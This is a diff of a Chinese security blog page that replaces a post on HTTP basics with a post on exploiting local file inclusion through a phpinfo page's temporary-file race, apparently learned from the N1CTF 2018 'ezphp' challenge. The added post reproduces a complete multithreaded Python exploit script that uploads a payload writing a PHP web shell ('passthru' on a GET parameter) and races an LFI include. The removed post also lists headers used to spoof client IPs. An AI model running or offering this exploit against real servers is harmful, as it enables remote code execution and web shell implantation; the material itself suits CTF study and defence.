@@ -15,21 +15,22 @@
 
 
 
-<meta name="description" content="— 从零开始的笔记 —— HTTP基础知识 —">
+<meta name="description" content="— 从零开始的笔记 —— phpinfo+LFI —">
 <meta name="keywords" content="web">
 <meta property="og:type" content="article">
-<meta property="og:title" content="WEB-HTTP基础">
-<meta property="og:url" content="http://lalajun.com/2018/01/30/WEB-HTTP基础/index.html">
+<meta property="og:title" content="WEB-基于phpinfo的包含临时文件">
+<meta property="og:url" content="http://lalajun.com/2018/04/03/web-phpinfo包含临时文件/index.html">
 <meta property="og:site_name" content="啦啦菌NODE">
-<meta property="og:description" content="— 从零开始的笔记 —— HTTP基础知识 —">
+<meta property="og:description" content="— 从零开始的笔记 —— phpinfo+LFI —">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="http://ww4.sinaimg.cn/large/006iKNp3ly1fnyr3e08oej30hs0a0t9n.jpg">
-<meta property="og:image" content="http://ww3.sinaimg.cn/large/006iKNp3ly1fnyr3vkg2ej30hs0b2wfo.jpg">
-<meta property="og:updated_time" content="2018-04-02T08:26:56.314Z">
+<meta property="og:image" content="http://ww3.sinaimg.cn/large/006iKNp3gy1fpycn3vin6j30oo0emgqi.jpg">
+<meta property="og:image" content="http://ww2.sinaimg.cn/large/006iKNp3gy1fpzlkb0peoj30hd05ddfx.jpg">
+<meta property="og:image" content="http://ww3.sinaimg.cn/large/006iKNp3gy1fpzlkg4yewj30x90bidh4.jpg">
+<meta property="og:updated_time" content="2018-04-03T09:32:25.997Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="WEB-HTTP基础">
-<meta name="twitter:description" content="— 从零开始的笔记 —— HTTP基础知识 —">
-<meta name="twitter:image" content="http://ww4.sinaimg.cn/large/006iKNp3ly1fnyr3e08oej30hs0a0t9n.jpg">
+<meta name="twitter:title" content="WEB-基于phpinfo的包含临时文件">
+<meta name="twitter:description" content="— 从零开始的笔记 —— phpinfo+LFI —">
+<meta name="twitter:image" content="http://ww3.sinaimg.cn/large/006iKNp3gy1fpycn3vin6j30oo0emgqi.jpg">
 
 <link rel="apple-touch-icon" href= "/apple-touch-icon.png">
 
@@ -61,7 +62,7 @@
 <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
 
 
-<title>WEB-HTTP基础 | 啦啦菌NODE</title>
+<title>WEB-基于phpinfo的包含临时文件 | 啦啦菌NODE</title>
 
 <script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
 <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
@@ -274,11 +275,11 @@
     </div>
     <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
 </nav>
-      <div class="body-wrap"><article id="post-WEB-HTTP基础" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-web-phpinfo包含临时文件" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2018/01/30/WEB-HTTP基础/" class="article-date">
-      <time datetime="2018-01-30T08:29:33.000Z" itemprop="datePublished">2018-01-30</time>
+      <a href="/2018/04/03/web-phpinfo包含临时文件/" class="article-date">
+      <time datetime="2018-04-03T06:07:12.000Z" itemprop="datePublished">2018-04-03</time>
 </a>
 
 
@@ -293,7 +294,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      WEB-HTTP基础
+      WEB-基于phpinfo的包含临时文件
     </h1>
   
 
@@ -314,95 +315,40 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <p>— 从零开始的笔记 —<br>— HTTP基础知识 —<br><a id="more"></a></p>
-<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>emmm…终于系统地整理了一下经常看到但是没有去好好了解的HTTP的东西，那么开始。</p>
-<h2 id="HTTP结构"><a href="#HTTP结构" class="headerlink" title="HTTP结构"></a>HTTP结构</h2><p><strong>请求结构</strong>：<br><img src="http://ww4.sinaimg.cn/large/006iKNp3ly1fnyr3e08oej30hs0a0t9n.jpg" alt=""><br>HTTP版本有两种：1.0 和 1.1<br>我们需要注意到的差异是 1.1版本请求必须使用HOST请求消息头</p>
-<p><strong>响应结构</strong>：<br><img src="http://ww3.sinaimg.cn/large/006iKNp3ly1fnyr3vkg2ej30hs0b2wfo.jpg" alt=""></p>
-<h2 id="常用HTTP消息头部"><a href="#常用HTTP消息头部" class="headerlink" title="常用HTTP消息头部"></a>常用HTTP消息头部</h2><p>先给出一些通用的消息头<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">Connection：HTTP传输后是关闭TCP链接，还是保持链接开放</div><div class="line">Content-Length：消息主体字节长度</div><div class="line">Content-Type：消息主体内容类型；HTML文档内容类型为text/html</div><div class="line">Content-Encoding：为消息主体内容指定编码形式（如gzip）；一些应用使用它来压缩主体，以加快传输速度</div><div class="line">Transfer-Encoding：为方便通过HTTP传输而对消息主体使用的任何编码。使用这个消息头，通常用它指定块编码</div></pre></td></tr></table></figure></p>
-<h2 id="HTTP请求消息头部"><a href="#HTTP请求消息头部" class="headerlink" title="HTTP请求消息头部"></a>HTTP请求消息头部</h2><p>下面开始说明HTTP请求消息部分，先从消息头部开始：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">User-Agent:UA,用户代理，使得服务器能够识别客户使用的操作系统及版本、CPU 类型、浏览器及版本、浏览器渲染引擎、浏览器语言、浏览器插件等。</div><div class="line">Referer：表示发出请求的原始URL，跳转</div><div class="line">Host：想访问的WEB服务器的域名/IP 地址和端口号</div><div class="line">Accept：客户端可以处理的媒体类型，按优先级排序；在一个以逗号为分隔的列表中，可以定义多种类型和使用通配符。</div><div class="line">Accept-Charset：客户端接收的字符集</div><div class="line">Accept-Encoding: 客户端愿意接受哪些内容编码</div><div class="line">Authorization：用于为一种内置HTTP身份验证向服务器提交证书</div><div class="line">Cookie：提交服务器向客户端发布的其他参数</div><div class="line">If-Modified-Since:用于说明浏览器最后一收到所请求的资源的时间。如果服务器判断资源没有发生变化，就会发送状态码304响应，是客户端使用缓存的资源副本</div><div class="line">If-None-Match：指定一个实体标签——消息主体内容的标识符；服务器可以使用实体标签确定浏览器是否使用资源的缓冲副本</div></pre></td></tr></table></figure></p>
-<h3 id="User-Agent延伸"><a href="#User-Agent延伸" class="headerlink" title="User-Agent延伸"></a>User-Agent延伸</h3><p><a href="http://blog.csdn.net/u012175089/article/details/61199238" target="_blank" rel="external">补充参考1</a> <a href="http://blog.csdn.net/bone_ace/article/details/52476016" target="_blank" rel="external">补充参考2</a><br>IOS6系统格式：<br><code>User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A403 Safari/8536.25</code><br>safari5.1–Windows格式：<br><code>User-Agent: Mozilla/5.0(Windows;U;WindowsNT6.1;en-us)AppleWebKit/534.50(KHTML,likeGecko)Version/5.1Safari/534.50</code></p>
-<h3 id="伪造IP的HTTP请求头："><a href="#伪造IP的HTTP请求头：" class="headerlink" title="伪造IP的HTTP请求头："></a>伪造IP的HTTP请求头：</h3><p>X-Forwarded-For<br>Client-IP<br>x-remote-IP<br>x-originating-IP<br>x-remote-addr</p>
-<h2 id="HTTP请求头方法"><a href="#HTTP请求头方法" class="headerlink" title="HTTP请求头方法"></a>HTTP请求头方法</h2><pre><code>GET：获取资源，
-POST：传输实体内容，之后细说
-PUT：上传文件，传输文件到请求URL的位置。自身不带验证机制，存在安全性问题，需要关注。
-DELETE：删除文件，删除请求URL位置的文件，与上同
-HEAD：返回和GET一样的头，不返回主体；用于检查某一资源是否存在
-TRACE：返回服务器接受到的请求头；用于检测客户端与服务器之间是否存在任何操纵请求的代理服务器
-    有Max-Forward首字段：可以控制生存时间STEP
-CONNECT：链接至HTTP代理服务器，[详细说明](http://blog.csdn.net/kobejayandy/article/details/24606521)
-OPTIONS：返回服务器对特定资源可用的HTTP方法
-</code></pre><h3 id="POST方法的Content-Type的常用四种形式"><a href="#POST方法的Content-Type的常用四种形式" class="headerlink" title="POST方法的Content-Type的常用四种形式"></a>POST方法的Content-Type的常用四种形式</h3><p>通过HTNL的Form表单的Enctype属性指定使用的常用四种形式<br>application/x-www-form-urlencoded<br>multipart/form-data<br>application/json<br>text/xml<br>除此以外还有<br>application/x-java-serialized-object ： java序列化<br>application/x-amf：Flash序列化<br>application/soap+msbin1：Silverlight序列化</p>
-<h4 id="application-x-www-form-urlencoded-："><a href="#application-x-www-form-urlencoded-：" class="headerlink" title="application/x-www-form-urlencoded ："></a>application/x-www-form-urlencoded ：</h4><p>数据被编码为名称/值对</p>
-<pre><code>POST http://www.example.com HTTP/1.1
-Content-Type: application/x-www-form-urlencoded;charset=utf-8
-
-title=test&amp;sub%5B%5D=1&amp;sub%5B%5D=2&amp;sub%5B%5D=3 
-</code></pre><h4 id="multipart-form-data-："><a href="#multipart-form-data-：" class="headerlink" title="multipart/form-data ："></a>multipart/form-data ：</h4><p>可以使一块内容进行不同的编码形式<br>格式：Content-Type:multipart/form-data; boundary=（+随机的分割字符串）</p>
-<pre><code>POST http://www.example.com HTTP/1.1
-Content-Type:multipart/form-data; boundary=----WebKitFormBoundaryrGKCBY7qhFd3TrwA
-
-------WebKitFormBoundaryrGKCBY7qhFd3TrwA
-Content-Disposition: form-data; name=&quot;text&quot;
-
-title
-------WebKitFormBoundaryrGKCBY7qhFd3TrwA
-Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;chrome.png&quot;
-Content-Type: image/png
-
-PNG ... content of chrome.png ...
-------WebKitFormBoundaryrGKCBY7qhFd3TrwA-- 
-</code></pre><p>分割开头多<code>--</code> 最后一个结尾多<code>--</code></p>
-<h4 id="application-json-："><a href="#application-json-：" class="headerlink" title="application/json ："></a>application/json ：</h4><p>主体是序列化后的 JSON 字符串</p>
-<pre><code>POST http://www.example.com HTTP/1.1
-Content-Type: application/json;charset=utf-8
-
-{&quot;title&quot;:&quot;test&quot;,&quot;sub&quot;:[1,2,3]} 
-</code></pre><h4 id="text-xml-："><a href="#text-xml-：" class="headerlink" title="text/xml ："></a>text/xml ：</h4><p>以纯文本形式进行编码，其中不含任何控件或格式字符。 </p>
-<pre><code>POST http://www.example.com HTTP/1.1
-Content-Type: text/xml
-
-&lt;!--?xml version=&quot;1.0&quot;?--&gt;
-&lt;methodcall&gt;
-    &lt;methodname&gt;examples.getStateName&lt;/methodname&gt;
-    &lt;params&gt;
-        &lt;param&gt;
-            &lt;value&gt;&lt;i4&gt;41&lt;/i4&gt;&lt;/value&gt;
-
-    &lt;/params&gt;
-&lt;/methodcall&gt; 
-</code></pre><h2 id="HTTP响应消息头部"><a href="#HTTP响应消息头部" class="headerlink" title="HTTP响应消息头部"></a>HTTP响应消息头部</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">Server：指明WEB服务器软件</div><div class="line">Set-Cookie：发送一个cookie，分号分割，它将在随后向服务器发送的请求汇总由Cookie消息头返回</div><div class="line">	可选属性：</div><div class="line">	expires：设定cookie有效时间。使浏览器将cookie保存在永久性的存储器中，在随后的的浏览器会话中重复利用，直到到期。</div><div class="line">	domain：用于指定cookie有效域。这个域必须和收到cookie的域相同或者是它的父域</div><div class="line">	path：用于指定cookie的有效url路径</div><div class="line">	secure：设置，仅仅只在HTTPS请求中提交cookie</div><div class="line">	HttpOnly：无法通过客户端JS直接访问cookie</div><div class="line">Pragma：主要用于no-cache，浏览器不要将响应保存在缓存中</div><div class="line">Cache-Control：设置是否要缓存，及缓存的设置</div><div class="line">Expired：WEB服务器表明该实体将在什么时候过期</div><div class="line">ETag：指定一个实体标签，标志为实体的版本</div><div class="line">Location：服务器告诉浏览器，试图访问的对象已经被移到别的位置了，到该头部指定的位置去取。</div></pre></td></tr></table></figure>
-<h2 id="HTTP响应返回状态码"><a href="#HTTP响应返回状态码" class="headerlink" title="HTTP响应返回状态码"></a>HTTP响应返回状态码</h2><ul>
-<li>1XX——提供信息</li>
-<li>2XX——请求被成功提交</li>
-<li>3XX——客户端被重定向到其他资源</li>
-<li>4XX——请求包含某种错误</li>
-<li>5XX——服务器执行请求是遇到错误</li>
+        <p>— 从零开始的笔记 —<br>— phpinfo+LFI —<br><a id="more"></a></p>
+<h2 id="基于phpinfo的包含临时文件"><a href="#基于phpinfo的包含临时文件" class="headerlink" title="基于phpinfo的包含临时文件"></a>基于phpinfo的包含临时文件</h2><p>从N1CTF ezphp 的非预期解中知道的漏洞<br>开始找资料学习</p>
+<h3 id="利用前提"><a href="#利用前提" class="headerlink" title="利用前提"></a>利用前提</h3><ul>
+<li>LFI文件包含漏洞</li>
+<li>一个服务端的phpinfo页面</li>
 </ul>
-<pre><code>100 Continue——当客户端发送包含主体的请求，服务端返回100，表示已经收到请求消息头，让客户端继续发送主体。
-
-200 OK——已经成功提交请求，且响应主体中包含请求的结果。
-201 Created——PUT请求的响应返回状态码，表示请求已成功提交
-
-301 Moved Permanently——重定向到Location消息头中指定的URL，以后客户端应用新的URL替换原始的URL
-302 Found——暂时重定向到Location消息头中指定的URL，随后请求中恢复使用原始URL
-304 Not Modified——指示浏览器使用缓存中保存的所请求资源的副本。
-
-400 Bad Request——表示客户端提交了一个无效的HTTP请求。
-401 Unauthorized——服务器在许可请求前要求HTTP进行身份验证。身份验证类型在消息头WWW-Authenticate中说明
-403 Forbidden——不管是否通过身份验证，禁止任何人访问被请求的资源
-404 Not Found——所请求的资源不存在
-405 Method Not Allowed——URL不支持请求中使用的方法，如不支持PUT
-413 Request Entity Too Large——表示请求主体过长，服务器无法处理
-414 Request URI Too long——表示请求中URL过长，服务器无法处理
-
-500 InternalServer Error——表示服务器在执行请求时遇到错误。
-503 Service Unavailable——尽管WEB服务器运转正常，能够响应请求，但是服务器访问的应用程序无法做出响应。
-</code></pre><h2 id="HTTP身份验证"><a href="#HTTP身份验证" class="headerlink" title="HTTP身份验证"></a>HTTP身份验证</h2><p>在组织内部经常使用来访问内联网服务，但因特网上的Web应用程序很少使用</p>
+<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>先了解文件上传流程</p>
+<p><img src="http://ww3.sinaimg.cn/large/006iKNp3gy1fpycn3vin6j30oo0emgqi.jpg" alt="10.png"></p>
+<p>向服务器上任意php文件以<code>multipart/form-data</code>方式提交请求上传数据时，会生成临时文件,也就是说不需要一定有显性的上传功能也可以上传生成临时文件。</p>
+<p>下面向我们有的phpinfo页面以multipart/form-data方式提交文件</p>
+<p><img src="http://ww2.sinaimg.cn/large/006iKNp3gy1fpzlkb0peoj30hd05ddfx.jpg" alt="1.png"></p>
+<blockquote>
+<p>要注意的是 在multipart/form-data方式中，作为分割用的boundary字符串比定义处前面多两个<code>--</code></p>
+</blockquote>
+<p>查看结果，会有在通常GET请求中没看见的参数<code>$_FILES</code></p>
+<p><img src="http://ww3.sinaimg.cn/large/006iKNp3gy1fpzlkg4yewj30x90bidh4.jpg" alt="2.png"></p>
+<blockquote>
+<p>phpinfo中的 upload_tmp_dir 可以查看临时文件存放的文件夹，但是文件名是随机的，所以不能利用<br>如果 php.ini 没有设置 upload_tmp_dir，那么默认 php 进程会读写系统的临时目录<br>(Windows 默认为 C:/windows/temp，Linux 为 /tmp）<br>另外$_FILES 是在运行中作为环境参数产生的，所以在我们平常中访问的phpinfo()不会包含$_FILES</p>
+</blockquote>
+<p>接下来通过<code>phpinfo</code>中的<code>$_FILES</code>来获取临时文件的路径以及名称<br>假如上传的临时文件是木马文件，在被删除之前的极短时间之内,需要与服务器竞争时间包含木马文件，当然包含木马文件得到webshell不太现实，可以让木马文件重新生成一个shell文件或者提供一个反弹shell。</p>
+<h3 id="脚本竞争包含上传的木马文件"><a href="#脚本竞争包含上传的木马文件" class="headerlink" title="脚本竞争包含上传的木马文件"></a>脚本竞争包含上传的木马文件</h3><p>根据以下原理，来构建脚本</p>
 <ul>
-<li><strong>Basic</strong>： 在请求消息头中，用户证书以Base64的形式编码发送服务器</li>
-<li><strong>NTLM</strong>：  质询-响应式机制，使用某个windows NTLM协议版本</li>
-<li><strong>Digest</strong>： 质询-响应式机制，随同用户证书一起使用一个随机值MD5校验和。</li>
+<li>通过分块传输编码，提前获知临时文件名称；<br>分块传输可以实现在未完全传输完成时即可获知临时文件名，可以尽早发起文件包含请求，赶在删除之前执行代码。</li>
+<li>通过增加临时文件名后数据长度来延长时间；<br>通过观察PHPinfo的信息，在$_FILES信息下面，还有请求头的相关信息，我们可以在请求的时候，通过填充大量无用数据，来增加后面数据的长度，从而增加脚本的处理时间，为包含文件争取更多的时间。</li>
+<li>通过大量请求来延迟PHP脚本的执行速度。<br>通过大量的并发请求，提高成功的概率。</li>
 </ul>
+<p>本机虚拟机测试，无限失败，原因不明<br>自己写的脚本与他人成功的脚本都尝试过，无果，可能跟虚拟机环境有关系<br>贴出他人成功的脚本</p>
+<blockquote>
+<p>PS.写脚本时，发现python多线程时，不好在线程外读文件，在多个线程内使用这个文件，没有找到官方解释，可能是内存变动的原因</p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div></pre></td><td class="code"><pre><div class="line"><span class="comment">## PHP : Winning the race condition vs Temporary File Upload - PHPInfo() exploit</span></div><div class="line"><span class="comment"># Alternative way to easy_php @ N1CTF2018, solved by intrd &amp; shrimpgo - p4f team</span></div><div class="line"><span class="comment"># @license Creative Commons Attribution-ShareAlike 4.0 International License - http://creativecommons.org/licenses/by-sa/4.0/</span></div><div class="line"></div><div class="line"><span class="comment">## shell.txt payload content</span></div><div class="line"><span class="comment"># &lt;?php $c=fopen('shell.php','w');fwrite($c,'&lt;?php passthru($_GET["f"]);?&gt;');?&gt;</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> sys,Queue,threading,hashlib,os, requests,  pickle, os.path, re</div><div class="line"><span class="keyword">from</span> subprocess <span class="keyword">import</span> Popen, PIPE, STDOUT</div><div class="line"></div><div class="line">NumOfThreads=<span class="number">100</span></div><div class="line">queue = Queue.Queue()</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">checkHash</span><span class="params">(threading.Thread)</span>:</span></div><div class="line">	<span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,queue)</span>:</span></div><div class="line">		threading.Thread.__init__(self)</div><div class="line">		self.queue=queue</div><div class="line">	<span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></div><div class="line">		i=<span class="number">0</span></div><div class="line">		<span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">			self.clear=self.queue.get()</div><div class="line">			passtry = self.clear</div><div class="line">			<span class="keyword">if</span> passtry != <span class="string">""</span>:</div><div class="line"></div><div class="line">				padding=<span class="string">"A"</span> * <span class="number">8000</span></div><div class="line"></div><div class="line">				cookies = &#123;</div><div class="line">				    <span class="string">'PHPSESSID'</span>: <span class="string">'o99quh47clk8br394298tkv5o0'</span>,</div><div class="line">				    <span class="string">'othercookie'</span>: padding</div><div class="line">				&#125;</div><div class="line"></div><div class="line">				headers = &#123;</div><div class="line">				    <span class="string">'User-Agent'</span>: padding,</div><div class="line">				    <span class="string">'Pragma'</span>: padding,</div><div class="line">				    <span class="string">'Accept'</span>: padding,</div><div class="line">				    <span class="string">'Accept-Language'</span>: padding,</div><div class="line">				    <span class="string">'DNT'</span>: <span class="string">'1'</span></div><div class="line">				&#125;</div><div class="line"></div><div class="line">				files = &#123;<span class="string">'arquivo'</span>: open(<span class="string">'shell.txt'</span>,<span class="string">'rb'</span>)&#125;</div><div class="line"></div><div class="line">				reqs=<span class="string">'http://192.168.1.23/phpinfo.php?a='</span>+padding</div><div class="line">				<span class="comment">#reqs='http://172.17.0.2:80/index.php?action=../../var/www/phpinfo/index.php&amp;a='+padding</span></div><div class="line">				response = requests.post(reqs, headers=headers, cookies=cookies, files=files, verify=<span class="keyword">False</span>)</div><div class="line">				data = response.content</div><div class="line">				data = re.search(<span class="string">r"(?&lt;=tmp_name] =&amp;gt; ).*"</span>, data).group(<span class="number">0</span>)</div><div class="line">				<span class="keyword">print</span> data</div><div class="line"></div><div class="line">				reqs = <span class="string">'http://192.168.1.23/lfi.php?action=../..'</span>+data</div><div class="line">				<span class="comment">#reqs = 'http://172.17.0.2:80/index.php?action=../..'+data</span></div><div class="line">				<span class="keyword">print</span> reqs</div><div class="line">				response = requests.get(reqs, verify=<span class="keyword">False</span>)</div><div class="line">				data = response.content</div><div class="line">				<span class="keyword">print</span> data</div><div class="line"></div><div class="line">			i+=<span class="number">1</span></div><div class="line">			self.queue.task_done()</div><div class="line"></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(NumOfThreads):</div><div class="line">    t=checkHash(queue)</div><div class="line">    t.setDaemon(<span class="keyword">True</span>)</div><div class="line">    t.start()</div><div class="line"></div><div class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">9999</span>):</div><div class="line">	x=str(x)</div><div class="line">	queue.put(x.strip())</div><div class="line"></div><div class="line">queue.join()</div></pre></td></tr></table></figure>
+<blockquote>
+<p>参考<br><a href="https://www.insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf" target="_blank" rel="external">https://www.insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf</a><br><a href="http://dann.com.br/php-winning-the-race-condition-vs-temporary-file-upload-alternative-way-to-easy_php-n1ctf2018/" target="_blank" rel="external">http://dann.com.br/php-winning-the-race-condition-vs-temporary-file-upload-alternative-way-to-easy_php-n1ctf2018/</a><br><a href="http://www.freebuf.com/articles/web/79830.html" target="_blank" rel="external">http://www.freebuf.com/articles/web/79830.html</a></p>
+</blockquote>
 
       
     </div>
@@ -411,13 +357,13 @@ Content-Type: text/xml
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2018/01/30/WEB-HTTP基础/">WEB-HTTP基础</a></p>
+        <p><span>本文标题:</span><a href="/2018/04/03/web-phpinfo包含临时文件/">WEB-基于phpinfo的包含临时文件</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页">LaLa</a></p>
-        <p><span>发布时间:</span>2018-01-30, 16:29:33</p>
-        <p><span>最后更新:</span>2018-04-02, 16:26:56</p>
+        <p><span>发布时间:</span>2018-04-03, 14:07:12</p>
+        <p><span>最后更新:</span>2018-04-03, 17:32:25</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2018/01/30/WEB-HTTP基础/" title="WEB-HTTP基础">http://lalajun.com/2018/01/30/WEB-HTTP基础/</a>
-            <span class="copy-path" data-clipboard-text="原文: http://lalajun.com/2018/01/30/WEB-HTTP基础/　　作者: LaLa" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2018/04/03/web-phpinfo包含临时文件/" title="WEB-基于phpinfo的包含临时文件">http://lalajun.com/2018/04/03/web-phpinfo包含临时文件/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://lalajun.com/2018/04/03/web-phpinfo包含临时文件/　　作者: LaLa" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
         <p>
@@ -429,16 +375,10 @@ Content-Type: text/xml
 
     <nav id="article-nav">
         
-            <div id="article-nav-newer" class="article-nav-title">
-                <a href="/2018/02/26/WEB-Cookie注入与伪静态注入/">
-                    WEB-Cookie注入与伪静态注入
-                </a>
-            </div>
-        
         
             <div id="article-nav-older" class="article-nav-title">
-                <a href="/2018/01/25/python笔记/">
-                    python2.7笔记
+                <a href="/2018/03/19/WEB-LFI与RFI利用/">
+                    WEB-LFI与RFI利用
                 </a>
             </div>
         
@@ -450,7 +390,7 @@ Content-Type: text/xml
     <div id="toc" class="toc-article">
         <strong class="toc-title">文章目录</strong>
         
-            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HTTP结构"><span class="toc-text">HTTP结构</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#常用HTTP消息头部"><span class="toc-text">常用HTTP消息头部</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HTTP请求消息头部"><span class="toc-text">HTTP请求消息头部</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#User-Agent延伸"><span class="toc-text">User-Agent延伸</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#伪造IP的HTTP请求头："><span class="toc-text">伪造IP的HTTP请求头：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HTTP请求头方法"><span class="toc-text">HTTP请求头方法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#POST方法的Content-Type的常用四种形式"><span class="toc-text">POST方法的Content-Type的常用四种形式</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#application-x-www-form-urlencoded-："><span class="toc-text">application/x-www-form-urlencoded ：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#multipart-form-data-："><span class="toc-text">multipart/form-data ：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#application-json-："><span class="toc-text">application/json ：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#text-xml-："><span class="toc-text">text/xml ：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HTTP响应消息头部"><span class="toc-text">HTTP响应消息头部</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HTTP响应返回状态码"><span class="toc-text">HTTP响应返回状态码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HTTP身份验证"><span class="toc-text">HTTP身份验证</span></a></li></ol>
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#基于phpinfo的包含临时文件"><span class="toc-text">基于phpinfo的包含临时文件</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#利用前提"><span class="toc-text">利用前提</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#原理"><span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#脚本竞争包含上传的木马文件"><span class="toc-text">脚本竞争包含上传的木马文件</span></a></li></ol></li></ol>
         
     </div>
     <style>
@@ -481,15 +421,13 @@ Content-Type: text/xml
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2018/02/26/WEB-Cookie注入与伪静态注入/" title="上一篇: WEB-Cookie注入与伪静态注入">
-                <i class="fa fa-angle-left"></i>
-            </a>
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
         
 
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
 
         
-            <a href="/2018/01/25/python笔记/" title="下一篇: python2.7笔记">
+            <a href="/2018/03/19/WEB-LFI与RFI利用/" title="下一篇: WEB-LFI与RFI利用">
                 <i class="fa fa-angle-right"></i>
             </a>
         
